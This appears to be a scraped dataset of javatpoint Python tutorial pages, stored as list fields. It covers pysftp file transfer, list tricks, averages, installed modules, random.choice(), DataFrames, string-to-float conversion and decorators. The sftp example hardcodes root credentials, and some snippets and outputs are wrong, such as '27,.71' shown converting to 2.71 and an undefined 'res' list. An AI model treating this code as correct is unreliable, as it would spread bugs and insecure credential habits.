automatically at the end of the with statement', '# importing the required module', 'import pysftp', '# defining the host, username, and password', 'my_Hostname = ""welcomeblog.com""', 'my_Username = ""root""', 'my_Password = ""root""', '# using the python with statement', 'with pysftp.Connection(', 'host = my_Hostname,', 'username = my_Username,', 'password = my_Password)', 'as sftp:', 'print(""Connection succesfully established ... "")', '# Defining the remote path file path', ""remote_File_Path = '/var/backups/app.txt'"", '# Defining a directory in which we have to save the file.', '# or absolute ""/Users/krunal/Desktop/code/pyt/app.txt""', ""local_File_Path = './app.txt'"", '# Using the get method to download a file', 'sftp.get(remote_File_Path, local_File_Path)', '# connection closed automatically at the end of the with statement', '# importing the required module', 'import pysftp', '# defining the host, username, and password', 'my_Hostname = ""welcomeblog.com""', 'my_Username = ""root""', 'my_Password = ""root""', '# using the python with statement', 'with pysftp.Connection(', 'host = my_Hostname,', 'username = my_Username,', 'password = my_Password)', 'as sftp:', 'print(""Connection succesfully established ... "")', '# Defining the remote path file path', ""remote_File_Path = '/var/backups/app.txt'"", '# Using the get method to download a file', 'sftp.remove(remote_File_Path)', '# connection closed automatically at the end of the with statement']",[],[],['|||local_File_Path: This file path is the path to the local file.|||remote_File_Path: This file path is the path to the remote file.||||||remote_File_Path: This file path is a path where the file is located.|||local_File_Path: This file path is a path where the file will be downloaded.|||']
325,['Amazing hacks of Python'],"['In this tutorial, we will learn how awesome a Python language is for coding. We will discuss some of its amazing hacks, making Python the best among other languages.']","['https://www.javatpoint.com/average-of-list-in-python', 'https://www.javatpoint.com/python-pysftp-module', 'https://www.javatpoint.com/average-of-list-in-python', 'https://www.javatpoint.com/python-pysftp-module', 'https://www.javatpoint.com/average-of-list-in-python']",[],[],"['Hacks of Python', 'Conclusion']",[],[],"['Following are some amazingly cool hacks of Python that can make work easy for users and developers:', '1. List Comprehensions: It is the best and efficient technique for getting rid of writing pointless lines of program.', 'List comprehension consists of the following parts:', '4. artition of List into ""N"" Groups: The users can use the iter() function as an iterator over the sequence.', 'Explanation:', '5. Print more than One Item of List simultaneously', '6. Take the String as Input and Convert it into List:', '7. Convert List of Lists into Single List:']","['3. Transpose a Matrix: In Python, a user can implement the matrix as a nested list, which means a list inside a list. Every element of the list is treated as a row of the matrix.', 'In the above code, we used ""[iter(LIST_1)] * 2"" which produced different groups containing two elements of the \'LIST_1[]\' list. That is, the lists of length two will be generated using the elements from the first list.', '8. Print the Repeated Characters: Suppose our task is to print the patterns like ""122333444455555666666"". We can easily print this pattern in Python without using for loop.', 'In this tutorial, we have discussed 8 different amazing and cool hacks of Python, which makes it easy to work with for developers as well as beginners.']","['2. Printing a List: Lists are not printed according to our requirements; they are always printed in unnecessary square brackets and single quotes. But in Python, we have a solution for printing lists efficiently by using the join method of string. The ""join method"" can turn the list into a string by classifying every item into a string and connecting them with the string on which the join method is used.']","['import functools as FT', '# First, filter odd numbers', 'list_1 = filter(lambda K : K % 2 == 1, range(10, 30))', 'print (""List: "", list(list_1))', '# Then we will filter the odd square which is divisible by 5', 'list_1 = filter(lambda K : K % 5 == 0,', '[K ** 2 for K in range(1, 11) if K % 2 == 1])', 'print (""ODD SQUARE WHICH IS DIVISIBLE BY 5: "", list(list_1))', '# Here, we will filter negative numbers', 'list_1 = filter((lambda K : K < 0), range(-10, 10))', 'print (""Filter negative numbers: "", list(list_1))', '# Now, implement by using the max() function', 'print (""Maximum Number in the List: "")', 'print (FT.reduce(lambda S, T: S if (S > T) else T, [14, 11, 65, 110, 105]))', '# First declare the list:', ""ABC = ['LPG', 'WWF', 'XYZ', 'MPG']"", '# Then, we will print the list:', 'print (""The Simple List: "", ABC)', '# HEre, we will Print the list by using join method', ""print ('The List by using join method: %s' % ', ' .join(ABC))"", '# we can directly apply Join Function on the List:', 'print (\'Directly applying the join method: \', ("", "" .join(ABC)))', 'M_1 = [[5, 3], [1, 2], [9, 8]]', 'print (""Matrix 1: "")', 'for row in M_1 :', 'print (row)', 'rez_1 = [[M_1[K][L] for K in range(len(M_1))] for L in range(len(M_1[0]))]', 'print (""\\n"")', 'print (""Matrix 2: "")', 'for row in rez_1:', 'print (row)', '# First, we will Declare the list:', ""LIST_1 = ['E_1', 'E_2', 'E_3', 'E_4', 'E_5', 'E_6']"", 'partition_1 = list(zip (*[iter(LIST_1)] * 2))', 'print (""List after partitioning into different of groups of two elements: "", partition_1)', 'list_1 = [11, 13, 15, 17]', 'list_2 = [12, 14, 16, 18]', '# Here, we will use zip() function which will take 2 equal length list', '# and then merge them together into pairs', 'for K, L in zip(list_1, list_2):', 'print (K, L)', '# Reading a string from input as int format', ""# after splitting it's elements by white-spaces"", 'print (""Input: "")', 'formatted_list_1 = list(map (int, input().split()))', 'print (""Output as Formatted list: "", formatted_list_1)', '# importing the itertools', 'import itertools as IT', '# Declaring the list geek', 'LIST_1 = [[1, 2], [3, 4], [5, 6]]', '# chain.from_iterable() function will return the', '# elements of nested list', '# and iterate it from first list', '# of iterable till the last', '# end of the list', 'list_2 = list(IT.chain.from_iterable(LIST_1))', 'print (""Iterated list of \'LIST_1\': "", list_2)', 'print (""1"" + ""2"" * 2 + ""3"" * 3 + ""4"" * 4 + ""5"" * 5 + ""6"" * 6)']","['List:  [11, 13, 15, 17, 19, 21, 23, 25, 27, 29]', 'ODD SQUARE WHICH IS DIVISIBLE BY 5:  [25]', 'Filter negative numbers:  [-10, -9, -8, -7, -6, -5, -4, -3, -2, -1]', 'Maximum Number in the List:', '110', ""The Simple List:  ['LPG', 'WWF', 'XYZ', 'MPG']"", 'The List by using join method: LPG, WWF, XYZ, MPG', 'Directly applying the join method:  LPG, WWF, XYZ, MPG', 'Matrix 1:', '[5, 3]', '[1, 2]', '[9, 8]', 'Matrix 2:', '[5, 1, 9]', '[3, 2, 8]', ""List after partitioning into different of groups of two elements:  [('E_1', 'E_2'), ('E_3', 'E_4'), ('E_5', 'E_6')]"", '11 12', '13 14', '15 16', '17 18', 'Input:', '10 12 14 16 18 20 22', 'Output as Formatted list:  [10, 12, 14, 16, 18, 20, 22]', ""Iterated list of 'LIST_1':  [1, 2, 3, 4, 5, 6]"", '122333444455555666666']",[],['|||Output expression|||Input sequence|||A member of the input sequence represented by a variable|||The optional predicate parts.|||']
326,['Average of list in Python'],"['In this tutorial, we will discuss how we can compute the average of the list in Python.']","['https://www.javatpoint.com/append-vs-extend-vs-insert-in-python', 'https://www.javatpoint.com/snmp-module-in-python', 'https://www.javatpoint.com/append-vs-extend-vs-insert-in-python', 'https://www.javatpoint.com/snmp-module-in-python', 'https://www.javatpoint.com/append-vs-extend-vs-insert-in-python']",[],[],"['Using sum()', 'Using reduce()', 'Using mean()', 'Conclusion']",[],[],"['The average of a list is defined as the sum of elements present in the list divided by the number of elements present in the list.', 'Here, we will make use of three different approaches to calculate the average of the elements present in the list using Python.', ""So, let's get started…"", 'In the first method, we have used the sum() and len() to calculate the average.', 'The following program illustrates the same-', 'Explanation-', ""It's time to have a look at what we have done in the above program-"", 'In the next program, we will see how reduce() can help us to do the same.', 'The program given below shows how it can be done-', 'Explanation', ""Let's understand what we have done here-"", 'In the last program, we will learn how mean() can be used to calculate the average of list', 'The following program shows how it can be done-', 'Explanation-', ""It's time to have a look at what we have done in the above program-"", 'In this tutorial, we learned the different methods of calculating the average of elements present in the list using Python.']",[],[],"['# Python program to get average of a list', 'def calc_average(lst):', 'return sum(lst) / len(lst)', 'lst = [24, 19, 35, 46, 75, 29, 30, 18]', 'average = calc_average(lst)', '# Printing the average value of the list', 'print(""The average of the list is "", round(average, 3))', '# Python program to obtain the average of a list', '# Using reduce() and lambda', 'from functools import reduce', 'def calc_average(lst):', 'return reduce(lambda a, b: a + b, lst) / len(lst)', '#initializing the list', 'lst = [24, 19, 35, 46, 75, 29, 30, 18]', 'average = calc_average(lst)', '# Printing average of the list', 'print(""The Average of the list is "", round(average, 2))', '# Python program to obtain the average of a list', '# Using mean()', 'from statistics import mean', 'def calc_average(lst):', 'return mean(lst)', 'lst = [24, 19, 35, 46, 75, 29, 30, 18]', 'average = calc_average(lst)', '# Printing the average of the list', 'print(""The average of the list is "", round(average, 2))']","['The average of the list is  34.5', 'The average of the list is  34.5', 'The average of the list is  34.5']",[],"['|||Using sum()|||Using reduce()|||Using mean()||||||In the first step, we have created a function that takes a list as its parameter and then returns the average using sum() and len(). We know that sum() is used to calculate the sum of elements and len() tells us about the length of the list.|||After this, we have initialized the list whose average, we would like to calculate.|||In the next step, we have passed this list as a parameter in our function.|||Finally, we printed the resultant value.||||||In the first step, we have imported reduce from functools so that we can use it in our program to compute the average of elements.|||Now, we have created a function calc_average that takes a list as its parameter and uses lambda(a precise way of writing functions in python) inside reduce to calculate the average.|||After this we have initialized whose average, we would like to calculate.|||In the next step, we have passed this list as a parameter in our function.|||Finally, we printed the resultant value.||||||In the first step, we have imported mean from statistics so that we can use it in our program to compute the average of elements.|||Now, we have created a function calc_average that takes a list as its parameter and uses mean() to calculate the average.|||After this we have initialized whose average, we would like to calculate.|||In the next step, we have passed this list as a parameter in our function.|||Finally, we printed the resultant value.|||']"
327,['Check Installed Modules in Python'],"[""There are many times when we are working on someone else's system, and we have to complete our project there. It becomes more hectic when we have to install all the required modules in that system. It is actually messier when we have to start from scratch when we are in the mid-way of our project. The same also implies when someone else is working on our system for their own project.""]","['https://www.javatpoint.com/choice-in-python', 'https://www.javatpoint.com/average-of-list-in-python', 'https://www.javatpoint.com/choice-in-python', 'https://www.javatpoint.com/average-of-list-in-python', 'https://www.javatpoint.com/choice-in-python']","['https://static.javatpoint.com/python/images/check-installed-modules-in-python.png', 'https://static.javatpoint.com/python/images/check-installed-modules-in-python2.png', 'https://static.javatpoint.com/python/images/check-installed-modules-in-python3.png', 'https://static.javatpoint.com/python/images/check-installed-modules-in-python4.png']",[],"['Checking All Installed Python Modules', 'Conclusion']","['Method 1: Check All Locally Installed Python Modules:', 'Method 2: Check All Python Modules Installed:']",[],"['We are going to use the following two methods in this section to check all the installed Python modules in our system and get a list of them:', ""Let's understand the implementation of both the methods by using them and getting the list of all installed Python modules with them."", 'In the Python shell (or in Jupyter notebook and Jupyter lab), we have to write the following command inside the shell:', 'Here, we can see the names of all the locally installed Python modules present in our system, and we can also save them for future references.', ""To check all the installed Python modules, we can use the following two commands with the 'pip':"", ""Let's use both commands in order to understand their implementation in a better way.""]","[""In this tutorial, we are going to learn that how we can check installed Python modules in a system and get the list of all installed modules so that we don't have to waste more time."", 'As we have already discussed that why we would need to check the list of all installed Python modules in our system and how helpful it becomes when we have this list with us.', 'If we only want to check all the locally installed Python modules, then it is very simple. We have to open our Python shell (Where the output displays), or we can even perform this task in the Jupyter notebook and Jupyter lab.', 'When we press the enter key after writing the above-given command, the Python shell will start loading the names of all the locally installed Python modules in our system, and we can see the following status window on our screen:', ""Here, we have modified the 'pip list' command to: 'pip list-- format=column' so that we can get the list of all the installed Python modules in our system in the column formats.""]","[""Therefore, in such times or many other instances, we wish that we already know what modules are already present in the system so that we don't waste our precious time by using installation commands again for them. It is also helpful when we want to perform a particular action in our program, and we know we have these modules present in our system, and we can use these functions to do that particular task."", 'Now, we will learn the ways by which we can check all the installed Python modules in our system and get a complete list of them. We can even check locally present Python modules in the system as well as the Python modules that we have installed in our system from the command terminal using the pip installer.', 'As we can see, the list of all the locally installed Python modules is loading, and it will take some time for the Python shell to get the names of all locally installed Python modules. We have to wait for a while, and after that, it will display all the locally installed Python modules in our system, as we can see in the following output screen:', ""(i) Using the 'pip freeze' Command: We have to use the 'pip freeze' command inside the command prompt terminal of our device. First, we have to open the command prompt terminal, and then we have to write the 'pip command' in it, and after that, we have to press the enter key. When we press the enter key, the pip installer will start collecting the list of all installed Python modules, and after a while, it will show us the list of all installed Python modules as following:"", ""(ii) Using the 'pip list' Command: If the pip installer present in our system is of 1.3 or higher versions, then we can also use this method for getting the list of all the installed Python modules. Like in the previous method, we simply have to write the 'pip list' command inside the command prompt terminal of our device and press the enter key. When we press the enter key, the pip installer will start collecting the list of all installed Python modules, and after a while, it will show us the list of all installed Python modules as following:"", ""In this tutorial, we have learned that how important it is that we have a list of all the installed modules in our system or someone's system. Then, we have learned all the methods by which we can get the list of all the installed Python modules in the system. We learned about the different methods for locally installed Python modules and all Python modules installed in the system, and we used these methods to understand their implementation.""]","["">> help('modules')""]",[],[],"[""|||Check all locally installed Python modules|||Check all Python modules installed||||||Using 'pip freeze' command|||Using 'pip list command|||""]"
328,['choice() in Python'],"['In this tutorial, we will discuss the usage of the choice() method in Python.']","['https://www.javatpoint.com/convert-list-to-dataframe-in-python', 'https://www.javatpoint.com/check-installed-modules-in-python', 'https://www.javatpoint.com/convert-list-to-dataframe-in-python', 'https://www.javatpoint.com/check-installed-modules-in-python', 'https://www.javatpoint.com/convert-list-to-dataframe-in-python']",[],[],"['Displaying Boolean Result', 'Conclusion']","['Syntax', 'Program 1:', 'Program 2:', 'Program 3:', 'Program 4:', 'Program 5:', 'Program 6:', 'Program 7:']",[],"['To use this in our program, we need to first import the random module.', 'The function of choice() is to pick or generate a random element that can be anything a number or a string from a given collection.', 'The syntax for using choice() is', ""Let us have a look at some programs that will make it's application clear."", 'Consider the following program-', 'Explanation:', ""It's time to have a look at the explanation of the program given above-"", 'In the second program, we will see how it can be used to take a random character from the string.', 'Explanation:', ""Let's understand what happened here-"", ""Now, let's have a look at one more program and discuss another approach of writing this method."", 'Explanation:', ""Let's see what we have done in this program-"", 'In the next program, we shall see how we can choose a definite number of values to be displayed in the output.', 'Explanation:', ""It's time to have a look at the explanation of the program given above-"", 'Now, we will see how a for loop can be used to meet the same objective.', 'The following program illustrates the same-', 'In the next program, we will see how a random value from a given range of numbers can be taken.', 'Explanation:', ""Let's see what we have done in this program-"", 'Now, we will learn how to get the Boolean values using choice().', 'The following program shows how we can obtain the Boolean values.', 'Explanation:', ""It's time to have a look at the explanation of the program given above-"", 'Finally, the last program illustrates how random.getrandbits() can be used for the same purpose.', 'The procedure of the above program is similar to the previous program, the only difference is here we have used random.getrandbits().', 'In this tutorial, we learned the different ways of using choice() in our Python program.']",[],[],"['random.choice(x)', 'import random', 'list_values=[""C"",""C++"",""Python"",""Java"",""PHP""]', 'print(random.choice(list_values))', 'import random', 'string_value=""Python at JavaTpoint""', 'print(random.choice(string_value))', 'import random', 'print(""The random element from(1,2,3,4,5) is  "",random.choice([1,2,3,4,5]))', 'print(""The random element from(a,b,c,d,e,f) is  "",random.choice([\'a\',\'b\',\'c\',\'d\',\'e\',\'f\']))', '#importing random', 'import random', '#initializing the list', 'list_values=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]', '#taking a random value from the list', 'res=random.choices(list_values, k=4)', 'print(res)', '#importing random', 'import random', '#initializing the list', 'list_values=[1,2,3,4,5,6,7,8,9,10]', '#using for loop', 'for i in range(6):', 'print(random.choice(list_values))', '#importing random', 'import random', '#taking a random number', 'num_value = random.choice(range(10,120))', 'print(""A random number from the given range is"",num_value)', '#importing random', 'import random', '#taking a random boolean value', 'val=random.choice([True,False])', 'print(""The boolean value is"",val)', '#importing random', 'import random', '#taking a random boolean value', 'val=random.getrandbits(1)', 'print(bool(val))']","['Java', 'y', 'The random element from(1,2,3,4,5) is  5', 'The random element from(a,b,c,d,e,f) is f', '[2,2,3,2]', '1', '3', '1', '3', '1', '4', 'A random number from the given range is 31.', 'The boolean value is False', 'False']",[],"['|||In the first step, we have imported the random module.|||After this, we have initialized a list that contains different string values.|||Finally, we have used the choice() to pick a certain string from the provided list and display its value.||||||In the first step, we have imported the random module.|||After this, we have initialized a string called ""Python at JavaTpoint.|||Finally, we have used the choice() to pick a certain character from the provided string and display it\'s value.||||||In the first step, we have imported the random module.|||After this, we have written two print statements that will display the value.|||And then we can observe that we have used the random.choice() in the print function itself to pick a certain character or element from the provided list and display its value.||||||In the first step, we have imported the random module.|||After this, we have initialized a list that contains different numeric values.|||Finally, we have used the random.choice() in which we have specified the list name and k value as parameters.|||On executing the program, we can observe that the number of elements in the returned list depends on the value of k.||||||In the first step, we have imported the random module.|||After this, we have specified the range of numbers in choice().|||On executing the given program, it displays the expected output.||||||In the first step, we have imported the random module.|||After this, we have specified True and False inside choice().|||On executing the given program, the expected output is displayed.|||']"
329,['Convert List to dataframe in Python'],"['In this tutorial, we will see how we can use a list and convert it into a dataframe in Python.']","['https://www.javatpoint.com/convert-string-to-float-in-python', 'https://www.javatpoint.com/choice-in-python', 'https://www.javatpoint.com/convert-string-to-float-in-python', 'https://www.javatpoint.com/choice-in-python', 'https://www.javatpoint.com/convert-string-to-float-in-python']",[],[],['Conclusion'],"['Using pd.DataFrame()', 'Using List with Index and Column Names', 'Using zip()', 'Using Multidimensional List', 'Using Multidimensional List with Column and Data Type', 'Using Lists in the Dictionary']",[],"['But before starting with this, let us revise what is the list and what are dataframes?', 'The list is a data structure in python in which all the elements are enclosed within square brackets.', 'The example of a list is-', 'Data frames are the tabular representation of data in the form of rows and columns.', 'They can be used by importing pandas.', 'Now let us have a look at the different methods of converting a list to a dataframe in Python.', 'In the first approach we have used the pd.DataFrame() to convert a list.', 'The following program shows how it can be done-', 'Explanation:', ""It's time to have a look at the explanation of the above program-"", 'In the second method, we will create a dataframe that has an index value and a column name.', 'The program given below illustrates the same.', 'Explanation:', ""Now it's time to understand the above program-"", 'In this method we have used zip().', 'The following program shows how it can be done-', 'Explanation:', ""It's time to have a look at the explanation of the above program-"", 'In this method we will see how a multidimensional list can be used for conversion.', 'The program given below illustrates the same.', 'Explanation:', ""Now it's time to understand the above program-"", 'In this approach, we will see a slight variation of the above program.', 'The following program shows how it can be done-', 'Explanation:', ""It's time to have a look at the explanation of the above program-"", 'Finally, in the last method we will see how lists can be used with dictionaries and convert the list into a dataframe.', 'The program given below illustrates the same.', 'Explanation:', ""Now it's time to understand the above program-"", 'In this tutorial, we came across some interesting methods of converting a list to a dataframe in Python.']",[],[],"[""Colors=['Red', 'Blue', 'Green', 'Orange']"", 'import pandas as pd', '#list_values having strings', ""list_values = ['English','Hindi','Mathematics','Science','Social Science']"", 'df = pd.DataFrame(list_values)', 'print(df)', 'import pandas as pd', '#list_values having strings', ""list_values = ['English', 'Hindi', 'Mathematics', 'Science', 'Social Science']"", ""df = pd.DataFrame(list_values,index = ['i', 'ii', 'iii', 'iv', 'v'], columns = ['Subjects'])"", 'print(df)', 'import pandas as pd', '#list_values having strings', ""list_values = ['English', 'Hindi', 'Mathematics', 'Science', 'Social Science']"", 'list_index = [20, 21, 22, 23, 24]', ""df = pd.DataFrame(list(zip(list_values, list_index)), columns = ['Subjects', 'Code'])"", 'print(df)', 'import pandas as pd', '#list_values having strings', ""list_values = [['English', 4101], ['Hindi', 4102], ['Science', 4103], ['Mathematics', 4104], ['Computer', 4105]]"", ""df = pd.DataFrame(list_values, columns = ['Subject Name', 'Subject Code'])"", 'print(df)', 'import pandas as pd', '#list_values having strings', ""list_values = [['Colin', 'Lassiter', 46], ['James', 'Gomez', 24], ['Sara', 'Charles', 34], ['Raven', 'Stewart', 24], ['Oliver', 'Osment', 21]]"", ""df = pd.DataFrame(list_values, columns = ['First_Name', 'Last_Name', 'Age'], dtype = float)"", 'print(df)', 'import pandas as pd', '#list_values having strings', ""f_name = ['Colin', 'James', 'Sara', 'Raven', 'Oliver']"", ""l_name = ['Lassiter', 'Gomez', 'Charles', 'Stewart', 'Osment']"", 'age = [46, 24, 34, 24, 21]', ""dict = {'First Name':f_name, 'Last_Name':l_name, 'Age':age}"", 'df = pd.DataFrame(dict)', 'print(df)']","['0', '0         English', '1           Hindi', '2     Mathematics', '3         Science', '4  Social Science', 'Subjects', 'i           English', 'ii            Hindi', 'iii     Mathematics', 'iv          Science', 'v    Social Science', 'Subjects    Code', '0         English       20', '1           Hindi          21', '2     Mathematics    22', '3         Science          23', '4  Social Science      24', 'Subject Name  Subject Code', '0      English          4101', '1        Hindi          4102', '2      Science          4103', '3  Mathematics          4104', '4     Computer          4105', 'First_Name  Last_Name   Age', '0      Colin                  Lassiter      46.0', '1      James                Gomez       24.0', '2       Sara                  Charles      34.0', '3      Raven                Stewart      24.0', '4     Oliver                 Osment      21.0', 'First Name   Last_Name    Age', '0      Colin               Lassiter         46', '1      James            Gomez           24', '2       Sara              Charles           34', '3      Raven            Stewart          24', '4     Oliver             Osment          21']",[],"[""|||Using DataFrame()|||Using list with index and column names|||Using zip()|||Using Multidimensional list|||Using multidimensional list with column and data type|||Using lists in the dictionary||||||In the first step we have imported the pandas library.|||After this, we have declared the list that has strings as its values.|||Finally, we have passed this list in DataFrame() and displayed the output.||||||In the first step we have imported the pandas library.|||After this, we have declared the list that has strings as it's values.|||Finally, we have passed this list in DataFrame() with a list of index values and the column name.|||On executing the program, it displays the desired output.||||||In the first step, we have imported the pandas library.|||After this, we have declared the list that has strings as its values and another list contains the index values.|||Finally, we have passed the list_values and list_index in zip inside DataFrame() with a list of index values and the column name.|||On executing the program, it displays the desired output.||||||In the first step we have imported the pandas library.|||After this, we have declared the list contains different lists and each list has a string and an integer value.|||Finally, we have passed the list_values in pd.DataFrame() with a list of column names.|||On executing the program, it displays the desired output.||||||In the first step, we have imported the pandas library.|||After this, we have declared the list contains different lists and each list has two string values(first name and last name) and an integer value(age).|||Finally, we have passed the list_values in DataFrame() with a list of column names and the data type.|||On executing the program, it displays the desired output.||||||In the first step, we have imported the pandas library.|||After this, we have declared three lists, namely f_name, l_name, and age.|||In the next step, we have used these lists as values for the keys of the dictionary.|||Finally, we have passed dict in DataFrame().|||On executing the program, it displays the desired output.|||""]"
330,['Convert String to Float in Python'],['We are quite familiar with the data types available in Python and what kind of different operations we can perform on them.'],"['https://www.javatpoint.com/decorators-with-parameters-in-python', 'https://www.javatpoint.com/convert-list-to-dataframe-in-python', 'https://www.javatpoint.com/decorators-with-parameters-in-python', 'https://www.javatpoint.com/convert-list-to-dataframe-in-python', 'https://www.javatpoint.com/decorators-with-parameters-in-python']",[],[],['Conclusion'],"['Using Float Function', 'Converting a String with Commas', 'Converting to a Float List', 'Converting List of Strings to Float', 'Converting Using NumPy', 'Converting in Specified Decimal Points']",[],"['We know that,', ""Strings are a sequence of characters that are denoted using inverted commas ''. They are immutable which means they cannot be changed once declared."", 'And float values are nothing but the decimal values.', 'We can check the types using the program given below-', 'In this tutorial, we will discuss the different scenarios of converting a string to float in Python.', 'Let us look at the first case where we will use the float function,', 'The following program illustrates the same-', 'Explanation:', ""Let's understand what we have done in the above program-"", 'Let us look at the second case where we will convert a string with commas,', 'The following program illustrates the same-', 'Explanation:', ""Let's understand what we have done in the above program-"", 'Let us look at the third case where we will convert the string to a float list,', 'The following program illustrates the same-', 'Explanation:', ""Let's understand what we have done in the above program-"", 'Let us look at the fourth case where we will convert list of strings to float,', 'The following program illustrates the same-', ""Let's understand what we have done in the above program-"", 'Let us look at the fifth case where we will convert the string using numpy,', 'The following program illustrates the same-', 'Explanation:', ""Let's understand what we have done in the above program-"", 'Finally, in the last program we will see how we can convert a string to specified decimal points,', 'The following program illustrates the same-', 'Explanation:', ""Let's understand what we have done in the above program-"", 'So, in this tutorial, we understood the different scenarios and learned approaches to convert a string to float in Python.']",[],[],"['x = 2.71', '# printing the type of x', 'print(type(x))', ""y = 'Moscow'"", '#printing the type of y', 'print(type(y))', ""x = '2.71'"", 'res = float(x)', 'print(""The float value is "",res)', ""x = '27,.71'"", ""res = float(x.replace(',', ''))"", 'print(""The float value is "",res)', ""x='1.21, 2.34, 3.42, 9.22, 5.43'"", ""res=[float(i) for i in x.split(', ')]"", 'print(""The list having float values: ""+str(res))', ""x=['1.21', '2.34', '3.42', '9.22', '5.43']"", 'for i in x:', 'res.append(float(i))', ""print('The list having float values:',res)"", 'import numpy as np', ""x=np.array(['1.21', '2.34', '3.42', '9.22', '5.43'])"", 'res=x.astype(float)', ""print('The list having float values:',res)"", ""x='2.88731'"", 'val=float(x)', 'res=""{:.2f}"".format(val)', 'print(res)']","[""<class 'float'>"", ""<class 'str'>"", 'The float value is 2.71', 'The float value is 2.71', 'The list having float values: [ 1.21, 2.34, 3.42, 9.22, 5.43]', 'The list having float values: [ 1.21,2.34,3.42,9.22,5.43]', 'The list having float values: [1.21 2.34 3.42 9.22 5.43 ]', '2.89']",[],"[""|||Using float function|||Converting a string with commas|||Converting to a float list|||Converting a list of strings to float|||Converting using NumPy|||Converting in specified decimal points||||||The first step is to declare the string value that we would like to convert.|||After this, we will make use of a float() in which we'll then pass the variable that holds the string value.|||On executing the program, we can observe that it displays the required value.||||||The first step is to declare the string value that we would like to convert, this time a comma is present before the decimal point.|||After this, we will make use replace() inside float() in which we'll specify both, the value we would like to replace and with what it would be replaced.|||On executing the program, we can observe that it displays the required value.||||||The first step is to declare the string value that we would like to convert, this time there is a list of different decimal values separated with a comma.|||After this, we will make use of list comprehension that will take each value and convert it into the required type.|||On executing the program, we can observe that it displays the required value.||||||The first step is to declare the list that contains all the string values as it's elements|||After this, we have declared an empty list and used for loop that takes each element, converts it into float value, and appends it into res.|||On executing the program, we can observe that it displays the required value.||||||The first step is to import the numpy library as np.|||After this, we have declared the array that has all the string values.|||Once this is done, the next step is to use astype() and specify float in it since this is the functionality/feature we wish to apply on all the elements.|||On executing the program, we can observe that it displays the required value.||||||The first step is to declare the string value that we would like to convert.|||After this, we will make use of a float() and pass the variable x.|||Since we want our output in two decimal places, we will mention this in the next statement.|||On executing the program, we can observe that it displays the required value.|||""]"
331,['Decorators with Parameters in Python'],"['In this tutorial, we will discuss Decorators with parameters in Python, but before starting this topic, users must study Decorators in Python, Function Decorators.']","['https://www.javatpoint.com/dynamic-typing-in-python', 'https://www.javatpoint.com/convert-string-to-float-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-decorator', 'https://www.javatpoint.com/dynamic-typing-in-python', 'https://www.javatpoint.com/convert-string-to-float-in-python', 'https://www.javatpoint.com/dynamic-typing-in-python']","['https://static.javatpoint.com/python/images/decorators-with-parameters-in-python.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python2.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python3.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python4.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python5.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python6.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python7.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python8.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python9.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python10.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python11.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python12.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python13.png', 'https://static.javatpoint.com/python/images/decorators-with-parameters-in-python14.png']",[],['Conclusion'],"['Syntax:', 'Code Implementation of Decorators with Parameters:', 'How to Implement Decorators with Parameters:', 'Visual Representation of the Code Execution:', 'Alternate Way:', 'Visual Representation of the Code Execution:', 'Example 2:', 'Visual Representation of the Code Execution:', 'Visual Representation of the Process:']",[],"['Decorators are a very powerful and useful tool in Python because it allows users to modify the behaviour of function or class.', 'Python functions can be treated as supreme citizens as objects.', 'Decorators with parameters are like normal decorators.', 'First, we will see what we could get as output if we run a code of parameters directly without implementing any value.', 'Here, in the above code, as params is empty, we might get some errors.', ""Let's understand this stepwise:"", 'Inside the Decorator Execution:', 'Inside Inner Function Execution:', 'Decorator Function Execution:', 'Final Output Execution:', 'In the above code, we will get the outputs from the functions called using decorators with parameters.', 'In the following code, we will see how to write a code for using decorators for functions in an alternative way.', 'Now we will see different examples of using decorations with the parameter for better understanding the concept.', 'Example 1:', 'Final Output Execution:', 'The above example also shows that the enclosed inner function can access the parameters of the outer function.', 'Example 3:', 'Returning decorator_1:', 'Returning wrapper_1:', 'Executing message_1:', 'Executing String_Join:', 'Executing summation_1:', 'Final Output Execution:']","['In this tutorial, we have discussed how to execute the function using a decorator with parameters. We have also explained examples using a visual representation of inner functions and Outer functions of the parameters.']","['As we execute this code, the execution will start from left to right, which will call decorator(params) for returning the function object func_obj. the func_obj(function_name) will be called by using func_obj. Inside the inner function, required operations will be performed, and the actual function reference will return for assigning to the function_name. Now, the users can use the function_name() to call the function with decorator applied.']","['@decorator(params)', 'def function_name():', ""'''Function implementation'''"", 'def function_name():', ""'''Function implementation'''"", 'function_name = (decorator(params))(function_name)', 'def decorators_1(*args, **kwargs):', 'def inner_1(func_1):', ""'''"", 'doing operations with func_1', ""'''"", 'return func_1', 'return inner_1 # this is the function_object mentioned in the above content', '@decorators_1(params)', 'def func_1():', '""""""', 'function implementation', '""""""', 'def decorator_function(function_name):', 'print(""Inside the Decorator: "")', 'def inner_1(*args, **kwargs):', 'print(""Inside the Inner Function: "")', 'print(""\'Decorated the function\'"")', '# perform this operations with function_name', 'function_name()', 'return inner_1', '@decorator_function', 'def function_to():', 'print(""Inside the actual function"")', 'function_to()', 'def decorator_fun(function_name):', 'print (""Inside the Decorator: "")', 'def inner_1(*args, **kwargs):', 'print (""Inside the Inner Function: "")', 'print (""\'Decorated the function\'"")', '# Perform this operations with function_name', 'function_name()', 'return inner_1', 'def function_to():', 'print (""Inside the actual function"")', '# This is another way of using decorators', 'decorator_fun(function_to)()', 'def decorator_1(*args, **kwargs):', 'print(""Inside the Decorator"")', 'def inner_1(function_1):', '', '# Here, we will see the functionality of the code:', 'print (""Inside the inner function"")', 'print (""I am studying "", kwargs[\'JTP\'])', '', 'function_1()', '', '# Returning the inner function', 'return inner_1', '@decorator_1(JTP = ""COMPUTER SCIENCE AND ENGINEERING "")', 'def my_function():', 'print (""Inside the actual function"")', 'def decorator_function(A, B):', 'def Inner_1(function_1):', 'def wrapper_1(*args, **kwargs):', 'print (""I am studying COMPUTER 